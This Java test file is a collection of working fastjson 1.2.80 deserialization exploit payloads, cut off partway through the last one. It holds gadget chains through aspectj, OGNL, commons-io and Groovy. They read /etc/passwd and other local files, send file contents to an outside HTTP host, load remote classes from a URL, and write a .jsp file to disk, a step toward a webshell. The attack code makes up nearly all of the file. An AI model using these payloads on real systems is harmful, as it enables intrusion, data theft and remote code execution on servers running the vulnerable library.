package com.example.fastjson_1_2_80;

import com.alibaba.fastjson.JSON;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.util.Arrays;
import java.util.Base64;

/**
 * @author Whoopsunix
 */

public class fastjson_1_2_80 {

    // aspectj 文件读取
    @Test
    public void aspectj() {
        String payload1 = "{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\n" +
                "}";
        String payload2 = "{\n" +
                "    \"@type\":\"java.lang.Class\",\n" +
                "    \"val\":{\n" +
                "        \"@type\":\"java.lang.String\"{\n" +
                "        \"@type\":\"java.util.Locale\",\n" +
                "        \"val\":{\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",{\n" +
                "                \"@type\":\"java.lang.String\"\n" +
                "                \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\",\n" +
                "                \"newAnnotationProcessorUnits\":[{}]\n" +
                "            }\n" +
                "        }\n" +
                "    }";

        // 回显
        String payload3 = "{\n" +
                "    \"x\":{\n" +
                "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\n" +
                "        \"@type\":\"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\n" +
                "        \"fileName\":\"/etc/passwd\"\n" +
                "    }\n" +
                "}";

        // 报错回显
//        payload3 = "{\r\n"
//                + "	\"@type\": \"java.lang.Character\" {\r\n"
//                + "		\"C\": {\r\n"
//                + "			\"x\": {\r\n"
//                + "				\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\r\n"
//                + "				\"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
//                + "				\"fileName\": \"/etc/passwd\"\r\n"
//                + "			}\r\n"
//                + "		}\r\n"
//                + "	}\r\n"
//                + "}";
        JSON.parseObject(payload1);
        try {
            JSON.parseObject(payload2);
        } catch (Exception e) {
        }
        System.out.println(JSON.parseObject(payload3));
    }

    // aspectj http带出文件
    @Test
    public void aspectj_ognl_cc() {
        String payload1 = "";

        //http带出
        String payload2 = "{\r\n"
                + "	\"su14\": {\r\n"
                + "		\"@type\": \"java.lang.Exception\",\r\n"
                + "		\"@type\": \"ognl.OgnlException\"\r\n"
                + "	},\r\n"
                + "	\"su15\": {\r\n"
                + "		\"@type\": \"java.lang.Class\",\r\n"
                + "		\"val\": {\r\n"
                + "			\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
                + "			{\r\n"
                + "				\"@type\": \"java.lang.String\"\r\n"
                + "				\"@type\": \"ognl.OgnlException\",\r\n"
                + "				\"_evaluation\": \"\"\r\n"
                + "			}\r\n"
                + "		},\r\n"
                + "		\"su16\": {\r\n"
                + "			\"@type\": \"ognl.Evaluation\",\r\n"
                + "			\"node\": {\r\n"
                + "				\"@type\": \"ognl.ASTMethod\",\r\n"
                + "				\"p\": {\r\n"
                + "					\"@type\": \"ognl.OgnlParser\",\r\n"
                + "					\"stream\": {\r\n"
                + "						\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
                + "						\"delegate\": {\r\n"
                + "							\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
                + "							\"reader\": {\r\n"
                + "								\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\r\n"
                + "								\"url\": {\r\n"
                + "									\"@type\": \"java.lang.String\" {\r\n"
                + "										\"@type\": \"java.util.Locale\",\r\n"
                + "										\"val\": {\r\n"
                + "											\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
                + "											{\r\n"
                + "												\"@type\": \"java.lang.String\"\r\n"
                + "												\"@type\": \"java.util.Locale\",\r\n"
                /*http*/ + "												\"language\": \"http://192.168.66.136:1234/\",\r\n"
                + "												\"country\": {\r\n"
                + "													\"@type\": \"java.lang.String\" [{\r\n"
                + "														\"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
                /*带出文件*/ + "														\"fileName\": \"tmp\"\r\n"
                + "													}]\r\n"
                + "\r\n"
                + "												}\r\n"
                + "											}\r\n"
                + "										},\r\n"
                + "										\"charsetName\": \"UTF-8\",\r\n"
                + "										\"bufferSize\": 1024\r\n"
                + "									},\r\n"
                + "									\"boms\": [{\r\n"
                + "										\"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
                + "										\"charsetName\": \"UTF-8\",\r\n"
                + "										\"bytes\": [\r\n"
                + "											0\r\n"
                + "										]\r\n"
                + "									}]\r\n"
                + "								}\r\n"
                + "							}\r\n"
                + "						}\r\n"
                + "					},\r\n"
                + "					\"su17\": {\r\n"
                + "						\"$ref\": \"$.su16.node.p.stream\"\r\n"
                + "					},\r\n"
                + "					\"su18\": {\r\n"
                + "						\"$ref\": \"$.su17.bOM.bytes\"\r\n"
                + "					}\r\n"
                + "				}";
        System.out.println(payload1);

        try {
            JSON.parseObject(payload1);
        } catch (Exception e) {
        }
        JSON.parseObject(payload2);
    }

    @Test
    public void groovy() {
        String payload1 = "{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
                "    \"unit\":{}\n" +
                "}";
        String payload2 = "{\n" +
                "    \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                "    \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                "    \"config\":{\n" +
                "        \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                "        \"classpathList\":\"http://192.168.16.132:1234/\"\n" +
                "    }\n" +
                "}";

        try {
            JSON.parse(payload1);
        } catch (Exception e) {
        }
        System.out.println(JSON.parse(payload2));
    }

    /*
     * cc + ognl 读
     * */
    @Test
    public void ognl_io_read() {
        // 报错回显
        String payload1 = "{\r\n"
                + "	\"su14\": {\r\n"
                + "		\"@type\": \"java.lang.Exception\",\r\n"
                + "		\"@type\": \"ognl.OgnlException\"\r\n"
                + "	},\r\n"
                + "	\"su15\": {\r\n"
                + "		\"@type\": \"java.lang.Class\",\r\n"
                + "		\"val\": {\r\n"
                + "			\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
                + "			{\r\n"
                + "				\"@type\": \"java.lang.String\"\r\n"
                + "				\"@type\": \"ognl.OgnlException\",\r\n"
                + "				\"_evaluation\": \"\"\r\n"
                + "			}\r\n"
                + "		},\r\n"
                + "		\"su16\": {\r\n"
                + "			\"@type\": \"ognl.Evaluation\",\r\n"
                + "			\"node\": {\r\n"
                + "				\"@type\": \"ognl.ASTMethod\",\r\n"
                + "				\"p\": {\r\n"
                + "					\"@type\": \"ognl.OgnlParser\",\r\n"
                + "					\"stream\": {\r\n"
                + "						\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
                + "						\"delegate\": {\r\n"
                + "							\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
                + "							\"reader\": {\r\n"
                + "								\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\r\n"
                /*文件位置*/ + "								\"url\": \"file://tmp\"\r\n"
                + "							},\r\n"
                + "							\"charsetName\": \"UTF-8\",\r\n"
                + "							\"bufferSize\": 1024\r\n"
                + "						},\r\n"
                + "						\"boms\": [{\r\n"
                + "							\"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
                + "							\"charsetName\": \"UTF-8\",\r\n"
                + "							\"bytes\": [\r\n"
                /*文件bytes*/ + "								116,101,115,11\r\n"
                + "							]\r\n"
                + "						}]\r\n"
                + "					}\r\n"
                + "				}\r\n"
                + "			}\r\n"
                + "		},\r\n"
                + "		\"su17\": {\r\n"
                + "			\"$ref\": \"$.su16.node.p.stream\"\r\n"
                + "		},\r\n"
                + "		\"su18\": {\r\n"
                + "			\"$ref\": \"$.su17.bOM.bytes\"\r\n"
                + "		}\r\n"
                + "	}";

        // 报错布尔
        payload1 = "[{\"su15\":{\"@type\":\"java.lang.Exception\",\"@type\":\"ognl.OgnlException\",}},{\"su16\":{\"@type\":\"java.lang.Class\",\"val\":{ \"@type\":\"com.alibaba.fastjson.JSONObject\",{  \"@type\":\"java.lang.String\"  \"@type\":\"ognl.OgnlException\",  \"_evaluation\":\"\"}}},\n" +
                "{\"su17\":{   \"@type\": \"ognl.Evaluation\",   \"node\": {       \"@type\": \"ognl.ASTMethod\",       \"p\": {           \"@type\": \"ognl.OgnlParser\",           \"stream\":\n" +
                "{\n" +
                "      \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "      \"delegate\": {\n" +
                "        \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "        \"reader\": {\n" +
                "          \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                "          \"url\": \"file://tmp\"\n" +
                "          },\n" +
                "        \"charsetName\": \"UTF-8\",\n" +
                "        \"bufferSize\": 1024\n" +
                "      },\"boms\": [{\"@type\": \"org.apache.commons.io.ByteOrderMark\", \"charsetName\": \"UTF-8\", \"bytes\": [\n" +
                "116,101,115,116]}]\n" +
                "}}}}},{\"su18\" : {\"$ref\":\"$[2].su17.node.p.stream\"}},{\"su19\":{\n" +
                "\"$ref\":\"$[3].su18.bOM.bytes\"}},{\"su20\":{   \"@type\": \"ognl.Evaluation\",   \"node\": {       \"@type\": \"ognl.ASTMethod\",       \"p\": {           \"@type\": \"ognl.OgnlParser\",           \"stream\":{     \"@type\": \"org.apache.commons.io.input.BOMInputStream\",     \"delegate\": {       \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",       \"reader\":{\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
                "              \"charSequence\": {\"@type\": \"java.lang.String\"{\"$ref\":\"$[4].su19\"},\"start\": 0,\"end\": 0},       \"charsetName\": \"UTF-8\",       \"bufferSize\": 1024},\"boms\": [{\"@type\": \"org.apache.commons.io.ByteOrderMark\", \"charsetName\": \"UTF-8\", \"bytes\": [1]}]}}}}},{\"su21\" : {\"$ref\":\"$[5].su20.node.p.stream\"}}]";

        // http请求布尔回显
        payload1 = "[{\"su15\":{\"@type\":\"java.lang.Exception\",\"@type\":\"ognl.OgnlException\",}},{\"su16\":{\"@type\":\"java.lang.Class\",\"val\":{ \"@type\":\"com.alibaba.fastjson.JSONObject\",{  \"@type\":\"java.lang.String\"  \"@type\":\"ognl.OgnlException\",  \"_evaluation\":\"\"}}},\n" +
                "{\"su17\":{   \"@type\": \"ognl.Evaluation\",   \"node\": {       \"@type\": \"ognl.ASTMethod\",       \"p\": {           \"@type\": \"ognl.OgnlParser\",           \"stream\":\n" +
                "{\n" +
                "      \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "      \"delegate\": {\n" +
                "        \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "        \"reader\": {\n" +
                "          \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                "          \"url\": \"file://tmp\"\n" +
                "          },\n" +
                "        \"charsetName\": \"UTF-8\",\n" +
                "        \"bufferSize\": 1024\n" +
                "      },\"boms\": [{\"@type\": \"org.apache.commons.io.ByteOrderMark\", \"charsetName\": \"UTF-8\", \"bytes\": [\n" +
                "98]}]\n" +
                "}}}}},{\"su18\" : {\"$ref\":\"$[2].su17.node.p.stream\"}},{\"su19\":{\n" +
                "\"$ref\":\"$[3].su18.bOM.bytes\"}},{\"su22\":{   \"@type\": \"ognl.Evaluation\",   \"node\": {       \"@type\": \"ognl.ASTMethod\",       \"p\": {           \"@type\": \"ognl.OgnlParser\",           \"stream\":{     \"@type\": \"org.apache.commons.io.input.BOMInputStream\",     \"delegate\": {       \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",       \"reader\":{\"@type\":\"jdk.nashorn.api.scripting.URLReader\",\"url\":{\"@type\":\"java.lang.String\"{\"@type\":\"java.net.URL\",\"val\":{\"@type\":\"java.lang.String\"{\"@type\":\"java.util.Locale\",\"val\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\": \"java.lang.String\"\"@type\":\"java.util.Locale\",\"language\":\"http://192.168.66.136:1234/\",\"country\":{\"@type\":\"java.lang.String\"{\"$ref\":\"116,10\"}}}}},       \"charsetName\": \"UTF-8\",       \"bufferSize\": 1024},\"boms\": [{\"@type\": \"org.apache.commons.io.ByteOrderMark\", \"charsetName\": \"UTF-8\", \"bytes\": [1]}]}}}}},{\"su23\" : {\"$ref\":\"$[5].su22.node.p.stream\"}},{\"su20\":{   \"@type\": \"ognl.Evaluation\",   \"node\": {       \"@type\": \"ognl.ASTMethod\",       \"p\": {           \"@type\": \"ognl.OgnlParser\",           \"stream\":{     \"@type\": \"org.apache.commons.io.input.BOMInputStream\",     \"delegate\": {       \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",       \"reader\":{\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
                "              \"charSequence\": {\"@type\": \"java.lang.String\"{\"$ref\":\"$[4].su19\"},\"start\": 0,\"end\": 0},       \"charsetName\": \"UTF-8\",       \"bufferSize\": 1024},\"boms\": [{\"@type\": \"org.apache.commons.io.ByteOrderMark\", \"charsetName\": \"UTF-8\", \"bytes\": [1]}]}}}}},{\"su21\" : {\"$ref\":\"$[7].su20.node.p.stream\"}}]";
        JSON.parse(payload1);
    }

    @Test
    public void ognl_io_write() throws IOException {
        // 低版本
        String payload = "{\n" +
                "    \"su14\": {\n" +
                "        \"@type\": \"java.lang.Exception\",\n" +
                "        \"@type\": \"ognl.OgnlException\"\n" +
                "    },\n" +
                "    \"su15\": {\n" +
                "        \"@type\": \"java.lang.Class\",\n" +
                "        \"val\": {\n" +
                "            \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
                "            {\n" +
                "                \"@type\": \"java.lang.String\"\n" +
                "                \"@type\": \"ognl.OgnlException\",\n" +
                "                \"_evaluation\": \"\"\n" +
                "            }\n" +
                "        },\n" +
                "        \"su16\": {\n" +
                "            \"@type\": \"ognl.Evaluation\",\n" +
                "            \"node\": {\n" +
                "                \"@type\": \"ognl.ASTMethod\",\n" +
                "                \"p\": {\n" +
                "                    \"@type\": \"ognl.OgnlParser\",\n" +
                "                    \"stream\": {\n" +
                "                        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "                        \"delegate\": {\n" +
                "                            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "                            \"reader\": {\n" +
                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "      \"is\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "        \"input\":{\n" +
                "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "      \"reader\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
                "        \"charSequence\":{\"@type\":\"java.lang.String\"\"test8200个a\"\n" +
                "      },\n" +
                "      \"charsetName\":\"UTF-8\",\n" +
                "      \"bufferSize\":1024\n" +
                "    },\n" +
                "            \"branch\":{\n" +
                "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
                "      \"writer\":{\n" +
                "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
                "        \"file\":\"1.jsp\",\n" +
                "        \"encoding\":\"UTF-8\",\n" +
                "        \"append\": false\n" +
                "      },\n" +
                "      \"charsetName\":\"UTF-8\",\n" +
                "      \"bufferSize\": 1024,\n" +
                "      \"writeImmediately\": true\n" +
                "    },\n" +
                "        \"closeBranch\": true\n" +
                "      },\n" +
                "      \"httpContentType\":\"text/xml\",\n" +
                "      \"lenient\":false,\n" +
                "      \"defaultEncoding\":\"UTF-8\"\n" +
                "    },\n" +
                "                            \"charsetName\": \"UTF-8\",\n" +
                "                            \"bufferSize\": 1024\n" +
                "                        },\n" +
                "                        \"boms\": [{\n" +
                "                            \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "                            \"charsetName\": \"UTF-8\",\n" +
                "                            \"bytes\": [\n" +
                "                                36,82\n" +
                "                            ]\n" +
                "                        }]\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "        },\n" +
                "        \"su17\": {\n" +
                "            \"@type\": \"ognl.Evaluation\",\n" +
                "            \"node\": {\n" +
                "                \"@type\": \"ognl.ASTMethod\",\n" +
                "                \"p\": {\n" +
                "                    \"@type\": \"ognl.OgnlParser\",\n" +
                "                    \"stream\": {\n" +
                "                        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "                        \"delegate\": {\n" +
                "                            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "                            \"reader\": {\n" +
                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "      \"is\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.input\"},\n" +
                "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.branch\"},\n" +
                "        \"closeBranch\": true\n" +
                "      },\n" +
                "      \"httpContentType\":\"text/xml\",\n" +
                "      \"lenient\":false,\n" +
                "      \"defaultEncoding\":\"UTF-8\"\n" +
                "    },\n" +
                "                            \"charsetName\": \"UTF-8\",\n" +
                "                            \"bufferSize\": 1024\n" +
                "                        },\n" +
                "                        \"boms\": [{\n" +
                "                            \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "                            \"charsetName\": \"UTF-8\",\n" +
                "                            \"bytes\": [\n" +
                "                                36,82\n" +
                "                            ]\n" +
                "                        }]\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "        },\n" +
                "        \"su18\": {\n" +
                "            \"@type\": \"ognl.Evaluation\",\n" +
                "            \"node\": {\n" +
                "                \"@type\": \"ognl.ASTMethod\",\n" +
                "                \"p\": {\n" +
                "                    \"@type\": \"ognl.OgnlParser\",\n" +
                "                    \"stream\": {\n" +
                "                        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "                        \"delegate\": {\n" +
                "                            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "                            \"reader\": {\n" +
                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "      \"is\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.input\"},\n" +
                "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.branch\"},\n" +
                "        \"closeBranch\": true\n" +
                "      },\n" +
                "      \"httpContentType\":\"text/xml\",\n" +
                "      \"lenient\":false,\n" +
                "      \"defaultEncoding\":\"UTF-8\"\n" +
                "    },\n" +
                "                            \"charsetName\": \"UTF-8\",\n" +
                "                            \"bufferSize\": 1024\n" +
                "                        },\n" +
                "                        \"boms\": [{\n" +
                "                            \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "                            \"charsetName\": \"UTF-8\",\n" +
                "                            \"bytes\": [\n" +
                "                                36,82\n" +
                "                            ]\n" +
                "                        }]\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "        },\n" +
                "        \"su19\": {\n" +
                "            \"@type\": \"ognl.Evaluation\",\n" +
                "            \"node\": {\n" +
                "                \"@type\": \"ognl.ASTMethod\",\n" +
                "                \"p\": {\n" +
                "                    \"@type\": \"ognl.OgnlParser\",\n" +
                "                    \"stream\": {\n" +
                "                        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "                        \"delegate\": {\n" +
                "                            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "                            \"reader\": {\n" +
                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
                "      \"is\":{\n" +
                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
                "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.input\"},\n" +
                "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.is.branch\"},\n" +
                "        \"closeBranch\": true\n" +
                "      },\n" +
                "      \"httpContentType\":\"text/xml\",\n" +
                "      \"lenient\":false,\n" +
                "      \"defaultEncoding\":\"UTF-8\"\n" +
                "    },\n" +
                "                            \"charsetName\": \"UTF-8\",\n" +
                "                            \"bufferSize\": 1024\n" +
                "                        },\n" +
                "                        \"boms\": [{\n" +
                "                            \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
                "                            \"charsetName\": \"UTF-8\",\n" +
                "                            \"bytes\": [\n" +
                "                                36,82\n" +
                "                            ]\n" +
                "                        }]\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "        }   \n" +
                "    }";

//        // 高版本
//        payload = "{\n" +
//                "    \"su14\": {\n" +
//                "        \"@type\": \"java.lang.Exception\",\n" +
//                "        \"@type\": \"ognl.OgnlException\"\n" +
//                "    },\n" +
//                "    \"su15\": {\n" +
//                "        \"@type\": \"java.lang.Class\",\n" +
//                "        \"val\": {\n" +
//                "            \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
//                "            {\n" +
//                "                \"@type\": \"java.lang.String\"\n" +
//                "                \"@type\": \"ognl.OgnlException\",\n" +
//                "                \"_evaluation\": \"\"\n" +
//                "            }\n" +
//                "        },\n" +
//                "        \"su16\": {\n" +
//                "            \"@type\": \"ognl.Evaluation\",\n" +
//                "            \"node\": {\n" +
//                "                \"@type\": \"ognl.ASTMethod\",\n" +
//                "                \"p\": {\n" +
//                "                    \"@type\": \"ognl.OgnlParser\",\n" +
//                "                    \"stream\": {\n" +
//                "                        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
//                "                        \"delegate\": {\n" +
//                "                            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
//                "                            \"reader\": {\n" +
//                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
//                "      \"inputStream\":{\n" +
//                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
//                "        \"input\":{\n" +
//                "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
//                "      \"reader\":{\n" +
//                "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
//                "        \"charSequence\":{\"@type\":\"java.lang.String\"\"test\",\n" +
//                "        \"start\":0,\n" +
//                "        \"end\":2147483647\n" +
//                "      },\n" +
//                "      \"charsetName\":\"UTF-8\",\n" +
//                "      \"bufferSize\":1024\n" +
//                "    },\n" +
//                "            \"branch\":{\n" +
//                "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
//                "      \"writer\":{\n" +
//                "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
//                "        \"file\":\"1.jsp\",\n" +
//                "        \"charsetName\":\"UTF-8\",\n" +
//                "        \"append\": false\n" +
//                "      },\n" +
//                "      \"charsetName\":\"UTF-8\",\n" +
//                "      \"bufferSize\": 1024,\n" +
//                "      \"writeImmediately\": true\n" +
//                "    },\n" +
//                "        \"closeBranch\": true\n" +
//                "      },\n" +
//                "      \"httpContentType\":\"text/xml\",\n" +
//                "      \"lenient\":false,\n" +
//                "      \"defaultEncoding\":\"UTF-8\"\n" +
//                "    },\n" +
//                "                            \"charsetName\": \"UTF-8\",\n" +
//                "                            \"bufferSize\": 1024\n" +
//                "                        },\n" +
//                "                        \"boms\": [{\n" +
//                "                            \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
//                "                            \"charsetName\": \"UTF-8\",\n" +
//                "                            \"bytes\": [\n" +
//                "                                36,82\n" +
//                "                            ]\n" +
//                "                        }]\n" +
//                "                    }\n" +
//                "                }\n" +
//                "            }\n" +
//                "        },\n" +
//                "        \"su17\": {\n" +
//                "            \"@type\": \"ognl.Evaluation\",\n" +
//                "            \"node\": {\n" +
//                "                \"@type\": \"ognl.ASTMethod\",\n" +
//                "                \"p\": {\n" +
//                "                    \"@type\": \"ognl.OgnlParser\",\n" +
//                "                    \"stream\": {\n" +
//                "                        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
//                "                        \"delegate\": {\n" +
//                "                            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
//                "                            \"reader\": {\n" +
//                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
//                "      \"inputStream\":{\n" +
//                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
//                "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.inputStream.input\"},\n" +
//                "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.inputStream.branch\"},\n" +
//                "        \"closeBranch\": true\n" +
//                "      },\n" +
//                "      \"httpContentType\":\"text/xml\",\n" +
//                "      \"lenient\":false,\n" +
//                "      \"defaultEncoding\":\"UTF-8\"\n" +
//                "    },\n" +
//                "                            \"charsetName\": \"UTF-8\",\n" +
//                "                            \"bufferSize\": 1024\n" +
//                "                        },\n" +
//                "                        \"boms\": [{\n" +
//                "                            \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
//                "                            \"charsetName\": \"UTF-8\",\n" +
//                "                            \"bytes\": [\n" +
//                "                                36,82\n" +
//                "                            ]\n" +
//                "                        }]\n" +
//                "                    }\n" +
//                "                }\n" +
//                "            }\n" +
//                "        },\n" +
//                "        \"su18\": {\n" +
//                "            \"@type\": \"ognl.Evaluation\",\n" +
//                "            \"node\": {\n" +
//                "                \"@type\": \"ognl.ASTMethod\",\n" +
//                "                \"p\": {\n" +
//                "                    \"@type\": \"ognl.OgnlParser\",\n" +
//                "                    \"stream\": {\n" +
//                "                        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
//                "                        \"delegate\": {\n" +
//                "                            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
//                "                            \"reader\": {\n" +
//                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
//                "      \"inputStream\":{\n" +
//                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
//                "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.inputStream.input\"},\n" +
//                "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.inputStream.branch\"},\n" +
//                "        \"closeBranch\": true\n" +
//                "      },\n" +
//                "      \"httpContentType\":\"text/xml\",\n" +
//                "      \"lenient\":false,\n" +
//                "      \"defaultEncoding\":\"UTF-8\"\n" +
//                "    },\n" +
//                "                            \"charsetName\": \"UTF-8\",\n" +
//                "                            \"bufferSize\": 1024\n" +
//                "                        },\n" +
//                "                        \"boms\": [{\n" +
//                "                            \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
//                "                            \"charsetName\": \"UTF-8\",\n" +
//                "                            \"bytes\": [\n" +
//                "                                36,82\n" +
//                "                            ]\n" +
//                "                        }]\n" +
//                "                    }\n" +
//                "                }\n" +
//                "            }\n" +
//                "        },\n" +
//                "        \"su19\": {\n" +
//                "            \"@type\": \"ognl.Evaluation\",\n" +
//                "            \"node\": {\n" +
//                "                \"@type\": \"ognl.ASTMethod\",\n" +
//                "                \"p\": {\n" +
//                "                    \"@type\": \"ognl.OgnlParser\",\n" +
//                "                    \"stream\": {\n" +
//                "                        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
//                "                        \"delegate\": {\n" +
//                "                            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
//                "                            \"reader\": {\n" +
//                "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
//                "      \"inputStream\":{\n" +
//                "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
//                "        \"input\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.inputStream.input\"},\n" +
//                "        \"branch\":{\"$ref\": \"$.su16.node.p.stream.delegate.reader.inputStream.branch\"},\n" +
//                "        \"closeBranch\": true\n" +
//                "      },\n" +
//                "      \"httpContentType\":\"text/xml\",\n" +
//                "      \"lenient\":false,\n" +
//                "      \"defaultEncoding\":\"UTF-8\"\n" +
//                "    },\n" +
//                "                            \"charsetName\": \"UTF-8\",\n" +
//                "                            \"bufferSize\": 1024\n" +
//                "                        },\n" +
//                "                        \"boms\": [{\n" +
//                "                            \"@type\": \"org.apache.commons.io.ByteOrderMark\",\n" +
//                "                            \"charsetName\": \"UTF-8\",\n" +
//                "                            \"bytes\": [\n" +
//                "                                36,82\n" +
//                "                            ]\n" +
//                "                        }]\n" +
//                "                    }\n" +
//                "                }\n" +
//                "            }\n" +
//                "        }    \n" +
//                "    }";

        JSON.parseObject(payload);
    }

    @Test
    public void ognl_io_aspectj_code_write(){
        String str = "test";
        for (int i = 0; i < 8201; i++){
            str += "a";
        }

        byte[] sb = str.getBytes();
        String baseStr = Base64.getEncoder().encodeToString(sb);
        byte[] bytes = baseStr.getBytes();


        String payload = "\r\n"
                + "{\r\n"
                + "	\"su14\": {\r\n"
                + "		\"@type\": \"java.lang.Exception\",\r\n"
                + "		\"@type\": \"ognl.OgnlException\"\r\n"
                + "	},\r\n"
                + "	\"su15\": {\r\n"
                + "		\"@type\": \"java.lang.Class\",\r\n"
                + "		\"val\": {\r\n"
                + "			\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
                + "			{\r\n"
                + "				\"@type\": \"java.lang.String\"\r\n"
                + "				\"@type\": \"ognl.OgnlException\",\r\n"
                + "				\"_evaluation\": \"\"\r\n"
                + "			}\r\n"
                + "		},\r\n"
                + "		\"su16\": {\r\n"
                + "			\"@type\": \"ognl.Evaluation\",\r\n"
